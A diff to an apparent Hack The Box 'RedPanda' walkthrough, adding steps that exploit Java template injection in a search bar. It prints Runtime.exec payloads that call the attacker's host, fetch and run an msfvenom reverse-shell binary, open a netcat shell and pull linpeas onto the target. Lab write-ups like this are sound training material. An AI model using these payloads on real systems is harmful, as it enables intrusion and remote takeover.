@@ -1,4 +1,4 @@
-# Hack The Box - Knife Walkthrough without Metasploit
+# Hack The Box - redPanda Walkthrough without Metasploit
 
 ## Reconnaissance
 Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
@@ -213,3 +213,97 @@ Apart from this, while doing some testing,  I received an error message that it 
 
 ![rp-7](https://user-images.githubusercontent.com/87711310/214091147-d5361a25-c9e0-4d7f-97e1-5bfb7a99e2dd.png)
 
+
+I also tried to test with cURL by hosting an HTTP server on my kali and send a `cURL` request using `SSTI` on the search bar.
+
+```java
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.16.2")}
+```
+
+My kali was able to receive an incoming connection.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/RedPanda]
+└─$ python3 -m http.server 80                  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.170 - - [24/Jan/2023 00:45:47] "GET / HTTP/1.1" 200 -
+```
+
+Now, to get a reverse shell from the website, I, firstly, generated a reverse shell using `msfvenom`
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9999 -f elf > shell.elf
+```
+
+Started my `Netcat` listener for the reverse shell.
+
+```
+nc -lvnp 9999
+```
+
+Started my HTTP server in the same location as `shell.elf`. Then sent the following commands one by one over the website’s search bar to transfer shell.elf, change its permission, and execute it.
+
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.16.2/shell.elf")}
+
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./shell.elf")}
+
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./shell.elf")}
+```
+
+Once I sent the final execute command, I got a shell on my netcat listener
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/RedPanda]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.170] 52392
+whoami
+woodenk
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+woodenk@redpanda:/tmp/hsperfdata_woodenk$ ls
+
+```
+
+Then, I upgraded the shell and looked out for the user flag.
+
+```
+woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /home
+cd /home
+woodenk@redpanda:/home$ ls
+ls
+woodenk
+woodenk@redpanda:/home$ cd woodenk
+cd woodenk
+woodenk@redpanda:/home/woodenk$ ls
+ls
+user.txt
+woodenk@redpanda:/home/woodenk$ cat user.txt
+cat user.txt
+[REDACTED]
+
+```
+
+Tried running `sudo -l` but it asked me for `woodenk's` password, so I had to find another way. I uploaded `linpeas` to the target machine to find out some thing we can leverage to escalate privileges.
+
+
+```
+woodenk@redpanda:/home/woodenk$ wget 10.10.16.2/linpeas.sh
+wget 10.10.16.2/linpeas.sh
+--2023-01-24 06:13:17--  http://10.10.16.2/linpeas.sh
+Connecting to 10.10.16.2:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 777018 (759K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 758.81K   680KB/s    in 1.1s    
+
+2023-01-24 06:13:19 (680 KB/s) - ‘linpeas.sh’ saved [777018/777018]
+
+woodenk@redpanda:/home/woodenk$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+
+```
+I couldn't find any useful result from linpeas. So, then, I ran pspy to monitor the processes ran on the machine and I found something interesting here. 
+
+![rp-8](https://user-images.githubusercontent.com/87711310/214227654-bc642244-10aa-4c41-8096-3d43cee680ae.png)
